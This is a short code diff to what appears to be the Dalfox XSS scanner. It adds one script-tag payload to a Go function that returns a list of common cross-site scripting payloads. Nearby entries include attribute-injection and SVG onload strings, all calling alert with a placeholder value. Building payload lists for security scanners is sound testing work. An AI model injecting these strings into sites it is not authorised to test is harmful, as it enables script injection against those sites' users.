@@ -458,6 +458,7 @@ func GetWAFBypassPayloads() []string {
 func GetCommonPayload() []string {
         payload := []string{
                 // custom payload
+                "AMS-<script>alert(DALFOX_ALERT_VALUE)</script>-0621103704-27uRJb-980940-5381",
                 "game%22%20onfocus=%22alert(DALFOX_ALERT_VALUE)%22%20id=dalfox%20autofocus%20x=%22",
                 // include verify payload
                 "\"><SvG/onload=alert(DALFOX_ALERT_VALUE) id=dalfox>",
